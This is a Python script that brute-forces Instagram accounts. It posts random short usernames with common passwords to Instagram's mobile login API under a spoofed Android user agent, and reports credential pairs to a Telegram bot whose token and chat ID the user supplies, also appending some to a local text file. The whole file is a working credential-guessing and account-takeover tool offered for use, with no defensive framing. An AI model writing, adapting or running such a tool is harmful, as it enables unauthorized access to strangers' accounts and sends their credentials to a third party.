#libry
import requests
import random
from uuid import uuid4
import webbrowser
import os
#######################
os.system('clear')
print('\033[1;33m code by : \033[1;34m  Mr Sami ')
#os.system('clear')
logo='''
 ▄    ▄                ▄▄▄▄                  ▀   
 ██  ██  ▄ ▄▄         █▀   ▀  ▄▄▄   ▄▄▄▄▄  ▄▄▄   
 █ ██ █  █▀  ▀        ▀█▄▄▄  ▀   █  █ █ █    █   
 █ ▀▀ █  █                ▀█ ▄▀▀▀█  █ █ █    █   
 █    █  █            ▀▄▄▄█▀ ▀▄▄▀█  █ █ █  ▄▄█▄▄ 
'''

print(logo)
#webbrowser.open('')
############################
E = '\033[1;31m'
G = '\033[1;32m'
def HsEyUn():
	
	token = input(G+'➥token ➢ ')
	id = input(G+'➥ ID ➢ ')
	while True:
		us3 ='1q2w3e4r5t6y7u8i9o0plmknjbhvgcfxdzsa'
		userx = ''.join((random.choice(us3) for x in range(4)))
		usr = userx
		HsEu = ('1122334455', 'Aa123123', 'Aa123456', '12341234', 'qwer1234', '1234qwer', 'hacker123', 'hackers77', 'ahmad123', 'khald1234')
		t = random.choice(HsEu)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
'Cookie':'missing', 
'Accept-Encoding':'gzip, deflate', 
'Accept-Language':'en-US', 
'X-IG-Capabilities':'3brTvw==', 
'X-IG-Connection-Type':'WIFI', 
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
'Host':'i.instagram.com'}
		uid= str(uuid4())
		data = {'uuid':uid,
'password':t, 
'username':usr, 
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'}
		reqq= requests.post(url, headers=headers, data=data, allow_redirects=True)
		
		if "rate_limit_error" in reqq.text:
			print (G+f"Kid -13 Ban : {usr}:{t}")
			tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text= 👩‍💻➥ • Instagram Account ✓\n  ────────────  \n ➥• Username : {usr}\n ➥• Pass : {t}\n ➥• By : @TYG_TEAM\n ➥● Bot : @Explot_bot\n  ──────────── \n ')
			a = requests.post(tlg)
			open("the tsar.txt","a").write(f"{usr}:{t}\n")
			
		elif 'bad_password' in reqq.text:
			print(E+f"Error Password : {usr}:{t}")
		elif 'checkpoint_challenge_required' in reqq.text:
			print (G+f"Checkpoint : {usr}:{t}")
			tlgg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text= 👩‍💻➥ • Instagram Account ✓\n  ────────────  \n ➥• Username : {usr}\n ➥• Pass : {t}\n ➥• By : @TYG_TEAM\n ➥● Bot : @Explot_bot\n──────────── \n ')
			a = requests.post(tlgg)
			open("the tsar.txt","a").write(f"{usr}:{t}")
		
		else:
			print(G+f"Fall Login ! : {usr}:{t}")
			tlggg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text= 👩‍💻➥ • Instagram Account ✓\n  ────────────  \n ➥• Username : {usr}\n ➥• Pass : {t}\n ➥• By : @TYG_TEAM\n ➥● Bot : @Explot_bot\n ──────────── \n ')
			a = requests.post(tlggg)
HsEyUn()
